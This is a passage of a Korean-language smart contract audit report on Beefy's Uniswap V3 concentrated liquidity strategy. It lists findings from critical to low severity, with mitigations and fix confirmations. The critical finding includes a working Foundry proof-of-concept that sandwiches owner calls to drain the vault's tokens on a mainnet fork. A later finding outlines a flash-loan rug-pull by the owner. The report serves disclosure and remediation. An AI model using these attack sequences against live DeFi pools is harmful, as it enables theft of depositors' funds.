**Lead Auditors**

[Dacian](https://twitter.com/DevDacian)

[carlitox477](https://twitter.com/carlitox477)

**Assisting Auditors**

---

# 발견 사항
## 중대한 위험 (Critical Risk)

### 공격자가 `setPositionWidth` 및 `unpause`에 대한 소유자 호출을 샌드위치 공격하여 Beefy의 유동성을 불리한 범위로 재배치하도록 강제함으로써 프로토콜 토큰을 탈취할 수 있음

**설명:** `StrategyPassiveManagerUniswap` 계약의 소유자가 `setPositionWidth` 및 `unpause`를 호출할 때 공격자는 이러한 호출을 샌드위치 공격하여 프로토콜의 토큰을 탈취할 수 있습니다. 이는 `setPositionWidth` 및 `unpause`가 현재 틱(tick)을 기반으로 Beefy의 유동성을 새로운 범위로 재배치하고 `onlyCalmPeriods` 수정자를 확인하지 않기 때문에 가능합니다. 따라서 공격자는 이를 사용하여 Beefy가 불리한 범위에 유동성을 재배치하도록 강제할 수 있습니다.

**영향:** 공격자는 `setPositionWidth` 및 `unpause`에 대한 소유자 호출을 샌드위치 공격하여 프로토콜 토큰을 탈취할 수 있습니다.

**개념 증명 (Proof of Concept):** `test/forge/ConcLiqTests/ConcLiqWBTCUSDC.t.sol:`에 새로운 테스트 파일을 추가합니다.

```solidity
pragma solidity 0.8.23;

import {Test, console} from "forge-std/Test.sol";
import {IERC20} from "@openzeppelin-4/contracts/token/ERC20/ERC20.sol";
import {BeefyVaultConcLiq} from "contracts/protocol/concliq/vault/BeefyVaultConcLiq.sol";
import {BeefyVaultConcLiqFactory} from "contracts/protocol/concliq/vault/BeefyVaultConcLiqFactory.sol";
import {StrategyPassiveManagerUniswap} from "contracts/protocol/concliq/uniswap/StrategyPassiveManagerUniswap.sol";
import {StrategyFactory} from "contracts/protocol/concliq/uniswap/StrategyFactory.sol";
import {StratFeeManagerInitializable} from "contracts/protocol/beefy/StratFeeManagerInitializable.sol";
import {IStrategyConcLiq} from "contracts/interfaces/beefy/IStrategyConcLiq.sol";
import {IUniswapRouterV3} from "contracts/interfaces/exchanges/IUniswapRouterV3.sol";

// Test WBTC/USDC Uniswap Strategy
contract ConLiqWBTCUSDCTest is Test {
    BeefyVaultConcLiq vault;
    BeefyVaultConcLiqFactory vaultFactory;
    StrategyPassiveManagerUniswap strategy;
    StrategyPassiveManagerUniswap implementation;
    StrategyFactory factory;
    address constant pool = 0x9a772018FbD77fcD2d25657e5C547BAfF3Fd7D16;
    address constant token0 = 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599;
    address constant token1 = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address constant native = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address constant strategist = 0xb2e4A61D99cA58fB8aaC58Bb2F8A59d63f552fC0;
    address constant beefyFeeRecipient = 0x65f2145693bE3E75B8cfB2E318A3a74D057e6c7B;
    address constant beefyFeeConfig = 0x3d38BA27974410679afF73abD096D7Ba58870EAd;
    address constant unirouter = 0xE592427A0AEce92De3Edee1F18E0157C05861564;
    address constant keeper = 0x4fED5491693007f0CD49f4614FFC38Ab6A04B619;
    int24 constant width = 500;
    address constant user     = 0x161D61e30284A33Ab1ed227beDcac6014877B3DE;
    address constant attacker = address(0x1337);
    bytes tradePath1;
    bytes tradePath2;
    bytes path0;
    bytes path1;

    function setUp() public {
        BeefyVaultConcLiq vaultImplementation = new BeefyVaultConcLiq();
        vaultFactory = new BeefyVaultConcLiqFactory(address(vaultImplementation));
        vault = vaultFactory.cloneVault();
        implementation = new StrategyPassiveManagerUniswap();
        factory = new StrategyFactory(keeper);

        address[] memory lpToken0ToNative = new address[](2);
        lpToken0ToNative[0] = token0;
        lpToken0ToNative[1] = native;

        address[] memory lpToken1ToNative = new address[](2);
        lpToken1ToNative[0] = token1;
        lpToken1ToNative[1] = native;

        uint24[] memory fees = new uint24[](1);
        fees[0] = 500;

        path0 = routeToPath(lpToken0ToNative, fees);
        path1 = routeToPath(lpToken1ToNative, fees);

        address[] memory tradeRoute1 = new address[](2);
        tradeRoute1[0] = token0;
        tradeRoute1[1] = token1;

        address[] memory tradeRoute2 = new address[](2);
        tradeRoute2[0] = token1;
        tradeRoute2[1] = token0;

        tradePath1 = routeToPath(tradeRoute1, fees);
        tradePath2 = routeToPath(tradeRoute2, fees);

        StratFeeManagerInitializable.CommonAddresses memory commonAddresses = StratFeeManagerInitializable.CommonAddresses(
            address(vault),
            unirouter,
            keeper,
            strategist,
            beefyFeeRecipient,
            beefyFeeConfig
        );

        factory.addStrategy("StrategyPassiveManagerUniswap_v1", address(implementation));

        address _strategy = factory.createStrategy("StrategyPassiveManagerUniswap_v1");
        strategy = StrategyPassiveManagerUniswap(_strategy);
        strategy.initialize(
            pool,
            native,
            width,
            path0,
            path1,
            commonAddresses
        );

        vault.initialize(address(strategy), "Moo Vault", "mooVault");
    }

    // run with:
    // forge test --match-path test/forge/ConcLiqTests/ConcLiqWBTCUSDC.t.sol --fork-url https://rpc.ankr.com/eth --fork-block-number 19410822 -vvv
    function test_AttackerDrainsProtocolViaSetPositionWidth() public {
        // user deposits and beefy sets up its LP position
        uint256 BEEFY_INIT_WBTC = 10e8;
        uint256 BEEFY_INIT_USDC = 600000e6;
        deposit(user, true, BEEFY_INIT_WBTC, BEEFY_INIT_USDC);

        (uint256 beefyBeforeWBTCBal, uint256 beefyBeforeUSDCBal) = strategy.balances();

        // record beefy WBTC & USDC amounts before attack
        console.log("%s : %d", "LP WBTC Before Attack", beefyBeforeWBTCBal); // 999999998
        console.log("%s : %d", "LP USDC Before Attack", beefyBeforeUSDCBal); // 599999999999
        console.log();

        // attacker front-runs owner call to `setPositionWidth` using
        // a large amount of USDC to buy all the WBTC. This:
        // 1) results in Beefy LP having 0 WBTC and lots of USDC
        // 2) massively pushes up the price of WBTC
        //
        // Attacker has forced Beefy to sell WBTC "low"
        uint256 ATTACKER_USDC = 100000000e6;
        trade(attacker, true, false, ATTACKER_USDC);

        // owner calls `StrategyPassiveManagerUniswap::setPositionWidth`
        // This is the transaction that the attacker sandwiches. The reason is that
        // `setPositionWidth` makes Beefy change its LP position. This will
        // cause Beefy to deploy its USDC at the now much higher price range
        strategy.setPositionWidth(width);

        // attacker back-runs the sandwiched transaction to sell their WBTC
        // to Beefy who has deployed their USDC at the inflated price range,
        // and also sells the rest of their WBTC position to the remaining LPs
        // unwinding the front-run transaction
        //
        // Attacker has forced Beefy to buy WBTC "high"
        trade(attacker, false, true, IERC20(token0).balanceOf(attacker));

        // record beefy WBTC & USDC amounts after attack
        (uint256 beefyAfterWBTCBal, uint256 beefyAfterUSDCBal) = strategy.balances();

        // beefy has been almost completely drained of WBTC & USDC
        console.log("%s  : %d", "LP WBTC After Attack", beefyAfterWBTCBal); // 2
        console.log("%s  : %d", "LP USDC After Attack", beefyAfterUSDCBal); // 0
        console.log();

        uint256 attackerUsdcBal = IERC20(token1).balanceOf(attacker);
        console.log("%s  : %d", "Attacker USDC profit", attackerUsdcBal-ATTACKER_USDC);

        // attacker original USDC: 100000000 000000
        // attacker now      USDC: 101244330 209974
        // attacker profit = $1,244,330 USDC
    }

    function test_AttackerDrainsProtocolViaUnpause() public {
        // user deposits and beefy sets up its LP position
        uint256 BEEFY_INIT_WBTC = 0;
        uint256 BEEFY_INIT_USDC = 600000e6;
        deposit(user, true, BEEFY_INIT_WBTC, BEEFY_INIT_USDC);

        // owner pauses contract
        strategy.panic(0, 0);

        (uint256 beefyBeforeWBTCBal, uint256 beefyBeforeUSDCBal) = strategy.balances();

        // record beefy WBTC & USDC amounts before attack
        console.log("%s : %d", "LP WBTC Before Attack", beefyBeforeWBTCBal); // 0
        console.log("%s : %d", "LP USDC Before Attack", beefyBeforeUSDCBal); // 599999999999
        console.log();

        // owner decides to unpause contract
        //
        // attacker front-runs owner call to `unpause` using
        // a large amount of USDC to buy all the WBTC. This:
        // massively pushes up the price of WBTC
        uint256 ATTACKER_USDC = 100000000e6;
        trade(attacker, true, false, ATTACKER_USDC);

        // owner calls `StrategyPassiveManagerUniswap::unpause`
        // This is the transaction that the attacker sandwiches. The reason is that
        // `unpause` makes Beefy change its LP position. This will
        // cause Beefy to deploy its USDC at the now much higher price range
        strategy.unpause();

        // attacker back-runs the sandwiched transaction to sell their WBTC
        // to Beefy who has deployed their USDC at the inflated price range,
        // and also sells the rest of their WBTC position to the remaining LPs
        // unwinding the front-run transaction
        //
        // Attacker has forced Beefy to buy WBTC "high"
        trade(attacker, false, true, IERC20(token0).balanceOf(attacker));

        // record beefy WBTC & USDC amounts after attack
        (uint256 beefyAfterWBTCBal, uint256 beefyAfterUSDCBal) = strategy.balances();

        // beefy has been almost completely drained of USDC
        console.log("%s  : %d", "LP WBTC After Attack", beefyAfterWBTCBal); // 0
        console.log("%s  : %d", "LP USDC After Attack", beefyAfterUSDCBal); // 126790
        console.log();

        uint256 attackerUsdcBal = IERC20(token1).balanceOf(attacker);
        console.log("%s  : %d", "Attacker USDC profit", attackerUsdcBal-ATTACKER_USDC);
        // attacker profit = $548,527 USDC
    }

    // handlers
    function deposit(address depositor, bool dealTokens, uint256 token0Amount, uint256 token1Amount) public {
        vm.startPrank(depositor);

        if(dealTokens) {
            deal(address(token0), depositor, token0Amount);
            deal(address(token1), depositor, token1Amount);
        }

        IERC20(token0).approve(address(vault), token0Amount);
        IERC20(token1).approve(address(vault), token1Amount);

        uint256 _shares = vault.previewDeposit(token0Amount, token1Amount);

        vault.depositAll(_shares);

        vm.stopPrank();
    }

    function trade(address trader, bool dealTokens, bool tokenInd, uint256 tokenAmount) public {
        vm.startPrank(trader);

        if(tokenInd) {
            if(dealTokens) deal(address(token0), trader, tokenAmount);

            IERC20(token0).approve(address(unirouter), tokenAmount);

            IUniswapRouterV3.ExactInputParams memory params = IUniswapRouterV3.ExactInputParams({
                path: tradePath1,
                recipient: trader,
                deadline: block.timestamp,
                amountIn: tokenAmount,
                amountOutMinimum: 0
            });
            IUniswapRouterV3(unirouter).exactInput(params);
        }
        else {
            if(dealTokens) deal(address(token1), trader, tokenAmount);

            IERC20(token1).approve(address(unirouter), tokenAmount);

            IUniswapRouterV3.ExactInputParams memory params = IUniswapRouterV3.ExactInputParams({
                path: tradePath2,
                recipient: trader,
                deadline: block.timestamp,
                amountIn: tokenAmount,
                amountOutMinimum: 0
            });
            IUniswapRouterV3(unirouter).exactInput(params);
        }

        vm.stopPrank();
    }

    // Convert token route to encoded path
    // uint24 type for fees so path is packed tightly
    function routeToPath(
        address[] memory _route,
        uint24[] memory _fee
    ) internal pure returns (bytes memory path) {
        path = abi.encodePacked(_route[0]);
        uint256 feeLength = _fee.length;
        for (uint256 i = 0; i < feeLength; i++) {
            path = abi.encodePacked(path, _fee[i], _route[i+1]);
        }
    }
}
```

실행: `forge test --match-path test/forge/ConcLiqTests/ConcLiqWBTCUSDC.t.sol --fork-url https://rpc.ankr.com/eth --fork-block-number 19410822 -vvv`

**권장 완화 방법:** 두 가지 옵션:
* `setPositionWidth` 및 `unpause`에 `onlyCalmPeriods` 수정자를 추가합니다.
* 또는 `_setTicks`에 `onlyCalmPeriods` 수정자를 추가하고 다른 함수에서는 제거합니다.

두 번째 옵션이 선호되는데 그 이유는 다음과 같습니다:
* 특정 함수에 수정자를 넣는 것을 잊어버릴 가능성을 줄입니다.
* 공격 벡터가 프로토콜이 `pool.slot0`에서 틱을 새로 고친 다음 풀이 조작되었을 때 유동성을 배포하게 하는 것이므로 논리적으로 타당합니다.
* 함수 내 풀 조작을 방지합니다. 수정자가 긴 함수의 시작 부분에 있는 경우, `onlyCalmPeriods` 확인이 통과된 후(함수 시작 시) Beefy가 틱을 새로 고치고 유동성을 배포하기 전에 다른 주체(예: 악의적인 풀)가 외부 함수 호출 중 실행 제어를 가로채어 풀을 조작할 가능성이 있을 수 있습니다.

**Beefy:**
커밋 [2c5f4cb](https://github.com/beefyfinance/experiments/commit/2c5f4cb8d026bd7d4e842c993e032be507714b85) 및 [d7a7251](https://github.com/beefyfinance/experiments/commit/d7a7251270e678e536d017011afc3123d70f916b)에서 수정되었습니다.

**Cyfrin:** 확인되었습니다.

\clearpage
## 높은 위험 (High Risk)

### UniswapV3 스왑에 슬리피지(slippage) 매개변수가 없어 MEV가 더 적은 출력 토큰을 반환하도록 악용할 수 있음

**설명:** `UniV3Utils::swap`은 `amountOutMinimum: 0`으로 [스왑](https://github.com/beefyfinance/experiments/blob/14a313b76888581b05d42b6f7b6097c79f3e65c6/contracts/interfaces/exchanges/UniV3Utils.sol#L22)을 수행합니다. 이 함수는 `StrategyPassiveManagerUniswap::_chargeFees` [L375](https://github.com/beefyfinance/experiments/blob/14a313b76888581b05d42b6f7b6097c79f3e65c6/contracts/protocol/concliq/uniswap/StrategyPassiveManagerUniswap.sol#L375), [L389](https://github.com/beefyfinance/experiments/blob/14a313b76888581b05d42b6f7b6097c79f3e65c6/contracts/protocol/concliq/uniswap/StrategyPassiveManagerUniswap.sol#L389) 및 `BeefyQIVault::_swapRewardsToNative` [L223](https://github.com/beefyfinance/experiments/blob/14a313b76888581b05d42b6f7b6097c79f3e65c6/contracts/protocol/qidao/BeefyQIVault.sol#L223)에서 호출됩니다.

**영향:** [슬리피지 매개변수 부족](https://dacian.me/defi-slippage-attacks#heading-no-slippage-parameter)으로 인해 MEV 공격자는 스왑을 샌드위치 공격하여 그렇지 않은 경우보다 더 적은 출력 토큰을 프로토콜에 반환할 수 있습니다. `StrategyPassiveManagerUniswap`의 경우 감소된 출력 토큰은 프로토콜의 수수료에 적용됩니다.

공격이 수익성이 있을지 여부는 공격자가 지불해야 하는 가스 비용에 달려 있습니다. Beefy가 배포하려는 L2 및 Alt-L1에서는 가스 비용이 매우 낮기 때문에 `onlyCalmPeriods`가 허용할 수 있는 작은 풀 조작으로 이러한 스왑을 악용하는 것이 수익성이 있을 수 있습니다.

유효한 마감 기한 타임스탬프가 없으면 악의적인 검증자는 스왑 트랜잭션을 보류하고 즉시 실행했을 때보다 적은 토큰 금액을 반환하는 나중 시점에 실행할 수도 있습니다. `onlyCalmPeriods` 확인은 스왑이 여전히 평온한 기간(calm period)에 실행되지만 호출자가 호출했을 때 예상했던 것보다 적은 토큰을 반환하는 나중 시점에 실행되므로 이에 대한 보호를 제공하지 않는 것으로 보입니다.

이전 상태는 인기 있고 장기적인 NFT 민팅과 같이 가스 비용이 갑작스럽고 지속적으로 급등하여 유기적으로 발생할 수도 있습니다. 트랜잭션이 유기적으로 지연되어 나중에 실행되면 원래 실행되어야 했을 때보다 더 나쁜 스왑 결과가 발생할 수 있습니다.

**권장 완화 방법:** 유효한 슬리피지 매개변수([이상적으로 오프체인에서 계산됨](https://dacian.me/defi-slippage-attacks#heading-on-chain-slippage-calculation-can-be-manipulated))가 스왑에 전달되어야 합니다.

**Beefy:**
인정됨 - 알려진 문제입니다. 문제는 가격이 조작된 후 수확(harvest)이 호출되면 슬리피지 보호가 있어도 여전히 나쁜 거래가 발생한다는 것입니다. 우리는 이 공격의 실행 가능성을 완화하기 위해 자주 수확합니다. 또한 이것은 사용자에게 영향을 미치는 것이 아니라 프로토콜에 대한 수수료를 줄일 뿐입니다.

\clearpage
## 중간 위험 (Medium Risk)

### `block.timestamp`를 스왑 마감 기한으로 사용하는 것은 보호 기능을 제공하지 않음

**설명:** `UniV3Utils::swap`은 `deadline: block.timestamp`로 [스왑](https://github.com/beefyfinance/experiments/blob/14a313b76888581b05d42b6f7b6097c79f3e65c6/contracts/interfaces/exchanges/UniV3Utils.sol#L20)을 수행합니다. 이 함수는 `StrategyPassiveManagerUniswap::_chargeFees` [L375](https://github.com/beefyfinance/experiments/blob/14a313b76888581b05d42b6f7b6097c79f3e65c6/contracts/protocol/concliq/uniswap/StrategyPassiveManagerUniswap.sol#L375), [L389](https://github.com/beefyfinance/experiments/blob/14a313b76888581b05d42b6f7b6097c79f3e65c6/contracts/protocol/concliq/uniswap/StrategyPassiveManagerUniswap.sol#L389) 및 `BeefyQIVault::_swapRewardsToNative` [L223](https://github.com/beefyfinance/experiments/blob/14a313b76888581b05d42b6f7b6097c79f3e65c6/contracts/protocol/qidao/BeefyQIVault.sol#L223)에서 호출됩니다.

**영향:** 트랜잭션이 결국 포함되는 블록은 `block.timestamp`가 되므로 이는 [보호 기능을 제공하지 않습니다](https://dacian.me/defi-slippage-attacks#heading-no-expiration-deadline).

**권장 완화 방법:** 호출자는 원하는 마감 기한을 전달하고 이를 마감 기한 매개변수로 스왑에 전달해야 합니다.

**Beefy:**
인정됨 - 알려진 문제입니다.


### `_chargeFees`의 반올림으로 인해 기본(Native) 토큰이 `StrategyPassiveManagerUniswap` 계약에 영구적으로 갇힘

**설명:** `StrategyPassiveManagerUniswap::_chargeFees`는 LP 수수료를 기본 토큰으로 변환한 다음 기본 토큰을 다음과 같이 분배합니다.
* 수확을 시작한 보상으로 호출자에게
* Beefy 프로토콜에게
* 전략에 등록된 전략가에게

그러나 [나눗셈 중 반올림](https://github.com/beefyfinance/experiments/blob/14a313b76888581b05d42b6f7b6097c79f3e65c6/contracts/protocol/concliq/uniswap/StrategyPassiveManagerUniswap.sol#L397-L404)으로 인해 일부 토큰은 분배되지 않고 대신 `StrategyPassiveManagerUniswap` 계약 내부에 축적되어 영구적으로 갇히게 됩니다.

**영향:** 수수료는 `StrategyPassiveManagerUniswap` 계약 내부에 축적되어 영구적으로 갇히게 됩니다. 매번 그 양은 적지만, 특히 이 프로토콜이 Beefy가 현재 운영 중인 많은 블록체인에 배포될 예정이라는 점을 감안할 때 효과는 누적됩니다.

**권장 완화 방법:** 남은 모든 것을 Beefy 프로토콜에 분배하도록 `StrategyPassiveManagerUniswap::_chargeFees`를 리팩토링하십시오.

```solidity
uint256 callFeeAmount = nativeEarned * fees.call / DIVISOR;
IERC20Metadata(native).safeTransfer(_callFeeRecipient, callFeeAmount);

uint256 strategistFeeAmount = nativeEarned * fees.strategist / DIVISOR;
IERC20Metadata(native).safeTransfer(strategist, strategistFeeAmount);

uint256 beefyFeeAmount = nativeEarned - callFeeAmount - strategistFeeAmount;
IERC20Metadata(native).safeTransfer(beefyFeeRecipient, beefyFeeAmount);
```

**Beefy:**
커밋 [86c7de5](https://github.com/beefyfinance/experiments/commit/86c7de5fc00c2f8260dd729e929d2975a770e9e5)에서 수정되었습니다.

**Cyfrin:** 확인되었습니다.


### `StrategyPassiveManagerUniswap`은 `unirouter`에게 ERC20 토큰 허용(allowance)을 제공하지만 `unirouter`가 업데이트될 때 허용을 제거하지 않음

**설명:** `StrategyPassiveManagerUniswap`은 `unirouter`에게 ERC20 토큰 [허용](https://github.com/beefyfinance/experiments/blob/14a313b76888581b05d42b6f7b6097c79f3e65c6/contracts/protocol/concliq/uniswap/StrategyPassiveManagerUniswap.sol#L745-L748)을 제공합니다.

`unirouter`는 `unirouter`를 [변경](https://github.com/beefyfinance/experiments/blob/14a313b76888581b05d42b6f7b6097c79f3e65c6/contracts/protocol/beefy/StratFeeManagerInitializable.sol#L127-L130)할 수 있는 외부 함수 `setUnirouter`가 있는 `StratFeeManagerInitializable`에서 상속됩니다.

허용은 `StrategyPassiveManagerUniswap::panic`을 [호출](https://github.com/beefyfinance/experiments/blob/14a313b76888581b05d42b6f7b6097c79f3e65c6/contracts/protocol/concliq/uniswap/StrategyPassiveManagerUniswap.sol#L726-L729)해서만 제거할 수 있지만 `unirouter`는 `setUnirouter` 함수를 통해 언제든지 변경될 수 있습니다.

이로 인해 `unirouter`가 `setUnirouter`를 통해 업데이트되지만 이전 `unirouter`에 제공된 ERC20 토큰 승인이 제거되지 않는 상태가 될 수 있습니다.

**영향:** 이전 `unirouter` 계약은 `StratFeeManagerInitializable`에 대한 ERC20 토큰 승인을 계속 유지하므로 프로토콜이 `unirouter`를 변경했으므로 프로토콜의 의도가 아닐 때에도 프로토콜의 토큰을 계속 사용할 수 있습니다.

**권장 완화 방법:** 1) `StratFeeManagerInitializable::setUnirouter`를 `virtual`로 만들어 자식 계약에서 재정의할 수 있도록 합니다.
2) `StrategyPassiveManagerUniswap`은 `setUnirouter`를 재정의하여 부모 함수를 호출하여 `unirouter`를 업데이트하기 전에 모든 허용을 제거해야 합니다.

**Beefy:**
커밋 [8fd397f](https://github.com/beefyfinance/experiments/commit/8fd397f54a47c6f305721335b00896938cec13fe)에서 수정되었습니다.

**Cyfrin:** 확인되었습니다.


### `StratFeeManagerInitializable::beefyFeeConfig`에 대한 업데이트는 아직 청구되지 않은 보류 중인 LP 보상에 새로운 수수료를 소급 적용함

**설명:** 수수료 구성 `StratFeeManagerInitializable::beefyFeeConfig`는 `StratFeeManagerInitializable::setBeefyFeeConfig` [L164-167](https://github.com/beefyfinance/experiments/blob/14a313b76888581b05d42b6f7b6097c79f3e65c6/contracts/protocol/beefy/StratFeeManagerInitializable.sol#L164-L167)를 통해 업데이트될 수 있으며, LP 보상은 수집되고 수수료는 `StrategyPassiveManagerUniswap::_harvest` [L306-311](https://github.com/beefyfinance/experiments/blob/14a313b76888581b05d42b6f7b6097c79f3e65c6/contracts/protocol/concliq/uniswap/StrategyPassiveManagerUniswap.sol#L306-L311)를 통해 부과됩니다.

이를 통해 수수료 구성이 업데이트되어 예를 들어 Beefy의 프로토콜 수수료가 인상된 다음, 다음에 `harvest`가 호출될 때 이전에 더 낮은 수수료 체제에서 보류 중이었던 LP 보상에 더 높은 수수료가 소급 적용되는 상태가 될 수 있습니다.

**영향:** 프로토콜 소유자는 수수료 구조를 소급하여 변경하여 LP 보상을 프로토콜 사용자에게 분배하는 대신 훔칠 수 있습니다. 수수료의 소급 적용은 사용자가 이전 수수료 수준에서 유동성을 프로토콜에 입금하고 LP 보상을 생성했기 때문에 사용자에게 불공평합니다.

**권장 완화 방법:** 1) `StratFeeManagerInitializable::setBeefyFeeConfig`는 가상(virtual)으로 선언되어야 합니다.
2) `StrategyPassiveManagerUniswap`은 이를 재정의하고 부모 함수를 호출하기 전에 먼저 `_claimEarnings`를 호출한 다음 `_chargeFees`를 호출해야 합니다.

이렇게 하면 보류 중인 LP 보상이 수집되고 올바른 수수료가 부과되며, 그 후에만 새로운 수수료 구조가 업데이트됩니다.

**Beefy:**
인정됨.

\clearpage
## 낮은 위험 (Low Risk)

### `StratFeeManagerInitializable`의 스토리지 간격 누락으로 업그레이드 스토리지 슬롯 충돌이 발생할 수 있음

**설명:** `StratFeeManagerInitializable`은 스토리지 간격이 없는 상태 저장(stateful) [업그레이드 가능](https://github.com/beefyfinance/experiments/blob/14a313b76888581b05d42b6f7b6097c79f3e65c6/contracts/protocol/beefy/StratFeeManagerInitializable.sol#L9) 계약이며 자체 상태 `StrategyPassiveManagerUniswap`을 가진 [1개의 자식](https://github.com/beefyfinance/experiments/blob/14a313b76888581b05d42b6f7b6097c79f3e65c6/contracts/protocol/concliq/uniswap/StrategyPassiveManagerUniswap.sol#L18)을 가지고 있습니다.

**영향:** `StratFeeManagerInitializable` 계약에 추가 상태가 스토리지에 추가되는 업그레이드가 발생하면 자식 계약 `StrategyPassiveManagerUniswap` 내의 스토리지가 덮어쓰여지는 스토리지 충돌이 발생할 수 있습니다.

**권장 완화 방법:** OpenZeppelin [문서](https://docs.openzeppelin.com/upgrades-plugins/1.x/writing-upgradeable#storage-gaps)에 따라 `StratFeeManagerInitializable` 계약에 스토리지 간격을 추가하십시오.

**Beefy:**
커밋 [2143322](https://github.com/beefyfinance/experiments/commit/2143322ea2c73a6680675627a0777881cbd4440a)에서 수정되었습니다.

**Cyfrin:** 확인되었습니다.


### 업그레이드 가능한 계약이 `disableInitializers`를 호출하지 않음

**설명:** 코드베이스에는 OpenZeppelin Initializable을 사용하지만 OpenZeppelin 문서 [[1](https://docs.openzeppelin.com/contracts/4.x/api/proxy#Initializable-_disableInitializers--), [2](https://docs.openzeppelin.com/upgrades-plugins/1.x/writing-upgradeable#initializing_the_implementation_contract)]에 따라 `_disableInitializers`를 호출하는 생성자가 없는 다수의 업그레이드 가능한 계약이 있습니다.

**영향:** 불가능해야 할 때 계약 구현이 초기화될 수 있습니다.

**권장 완화 방법:** 모든 업그레이드 가능한 계약에는 다음과 같은 생성자가 있어야 합니다:
```solidity
/// @custom:oz-upgrades-unsafe-allow constructor
constructor() {
    _disableInitializers();
}
```

**Beefy:**
커밋 [4009179](https://github.com/beefyfinance/experiments/commit/4009179059190b782c63d022d310d14cb18f7781)에서 수정되었습니다.

**Cyfrin:** 확인되었습니다.


### `StrategyPassiveManagerUniswap` 소유자가 `onlyCalmPeriods` 매개변수를 조작하여 사용자의 예치된 토큰을 러그풀(rug-pull) 할 수 있음

**설명:** `StrategyPassiveManagerUniswap`에는 일부 허가된 역할이 있지만, 우리가 확인하도록 요청받은 공격 경로 중 하나는 허가된 역할이 사용자의 예치된 토큰을 러그풀 할 수 없다는 것이었습니다. `StrategyPassiveManagerUniswap` 계약의 소유자가 `_onlyCalmPeriods` 확인의 효율성을 줄이기 위해 주요 매개변수를 수정하여 이를 달성할 수 있는 방법이 있습니다. 이것은 유사한 프로토콜 Gamma가 [악용](https://rekt.news/gamma-strategies-rekt/)된 방식과 유사해 보입니다.

**개념 증명 (Proof of Concept):**
1. 소유자는 `StrategyPassiveManagerUniswap::setDeviation`을 호출하여 허용된 최대 편차를 큰 숫자로 늘리거나 `setTwapInterval`을 호출하여 twap 간격을 줄여 비효율적으로 만듭니다.
2. 소유자는 플래시 론을 받아 `pool.slot0`을 높은 값으로 조작합니다.
3. 소유자는 `BeefyVaultConcLiq::deposit`을 호출하여 예금을 수행합니다. 지분(shares)은 다음과 같이 계산됩니다:
```solidity
// @audit `price` is derived from `pool.slot0`
shares = _amount1 + (_amount0 * price / PRECISION);
```
4. `price`는 부풀려진 `pool.slot0`에서 파생되므로 소유자는 평소보다 훨씬 더 많은 지분을 받게 됩니다.
5. 소유자는 플래시 론을 풀고 `pool.slot0`을 정상 값으로 되돌립니다.
6. 소유자는 `BeefyVaultConcLiq::withdraw`를 호출하여 예금에서 받은 부풀려진 지분 수로 인해 가능한 것보다 훨씬 더 많은 토큰을 받습니다.

**영향:** `StrategyPassiveManagerUniswap`의 소유자는 사용자의 예치된 토큰을 러그풀 할 수 있습니다.

**권장 완화 방법:** Beefy는 이미 타임락 멀티시그 뒤에 모든 소유자 기능을 두려고 하며, 이러한 트랜잭션이 시도되면 의심스러운 매개변수는 미래의 공격이 올 것이라는 명백한 신호가 될 것입니다. 이 때문에 이 공격이 효과적으로 실행될 확률은 낮지만 여전히 가능합니다.

이 공격을 추가로 완화하는 한 가지 방법은 소유자가 이 공격을 가능하게 하는 값으로 매개변수를 변경할 수 없도록 최소 필수 twap 간격과 최대 필수 편차 금액을 갖는 것입니다.

**Beefy:**
커밋 [b5769c4](https://github.com/beefyfinance/experiments/commit/b5769c4ccad6357ac9d3de2c682749bbaeeae6d1)에서 수정되었습니다.

**Cyfrin:** 확인되었습니다.



### `_onlyCalmPeriods`는 MIN/MAX 틱을 고려하지 않아 엣지 케이스에서 예금, 인출 및 수확을 DOS할 수 있음

**설명:** Uniswap V3에서 유동성 공급자는 가격 범위 `[1.0001^{MIN_ TICK};1.0001^{MAX_TICK})` 사이에서만 유동성을 제공할 수 있습니다. 따라서 이것이 최소 및 최대 가격입니다.

```solidity
    function _onlyCalmPeriods() private view {
        int24 tick = currentTick();
        int56 twapTick = twap();

        if(
            twapTick - maxTickDeviationNegative > tick  ||
            twapTick + maxTickDeviationPositive < tick) revert NotCalm();
    }
```

`twapTick - maxTickDeviationNegative < MIN_TICK`이면 `tick`이 수년 동안 동일하더라도 이 함수는 되돌려집니다(revert). 이는 상태가 유지되는 동안 허용되어야 할 때 예금, 인출 및 수확을 DOS할 수 있습니다.

**권장 완화 방법:** 현재 구현을 다음과 같이 변경하는 것을 고려하십시오:

```diff
+   const int56 MIN_TICK = -887272;
+   const int56 MAX_TICK = 887272;
    function _onlyCalmPeriods() private view {
        int24 tick = currentTick();
        int56 twapTick = twap();

+       int56 minCalmTick = max(twapTick - maxTickDeviationNegative, MIN_TICK);
+       int56 maxCalmTick = min(twapTick - maxTickDeviationPositive, MAX_TICK);

        if(
-           twapTick - maxTickDeviationNegative > tick  ||
-           twapTick + maxTickDeviationPositive < tick) revert NotCalm();
+           minCalmTick > tick  ||
+           maxCalmTick < tick) revert NotCalm();
    }
```

**Beefy:**
커밋 [b5432d2](https://github.com/beefyfinance/experiments/commit/b5432d2c73f071f08ab34efcc570605f64808d38)에서 수정되었습니다.

**Cyfrin:** 확인되었습니다.


### `StrategyPassiveManagerUniswap::withdraw`는 `_addLiquidity`를 호출하기 전에 `_setTicks`를 호출해야 함

**설명:** 인출이 시작되면 `BeefyVaultConcLiq::withdraw`는 유동성을 제거하는 `StrategyPassiveManagerUniswap::beforeAction`을 [호출](https://github.com/beefyfinance/experiments/blob/14a313b76888581b05d42b6f7b6097c79f3e65c6/contracts/protocol/concliq/vault/BeefyVaultConcLiq.sol#L213)합니다.

유동성이 제거된 다른 4곳에서는 항상 `_addLiquidity`를 호출하기 직전에 `_setTicks`가 호출됩니다 [[1](https://github.com/beefyfinance/experiments/blob/14a313b76888581b05d42b6f7b6097c79f3e65c6/contracts/protocol/concliq/uniswap/StrategyPassiveManagerUniswap.sol#L181-L182), [2](https://github.com/beefyfinance/experiments/blob/14a313b76888581b05d42b6f7b6097c79f3e65c6/contracts/protocol/concliq/uniswap/StrategyPassiveManagerUniswap.sol#L315-L316), [3](https://github.com/beefyfinance/experiments/blob/14a313b76888581b05d42b6f7b6097c79f3e65c6/contracts/protocol/concliq/uniswap/StrategyPassiveManagerUniswap.sol#L717-L718), [4](https://github.com/beefyfinance/experiments/blob/14a313b76888581b05d42b6f7b6097c79f3e65c6/contracts/protocol/concliq/uniswap/StrategyPassiveManagerUniswap.sol#L740-L741)].

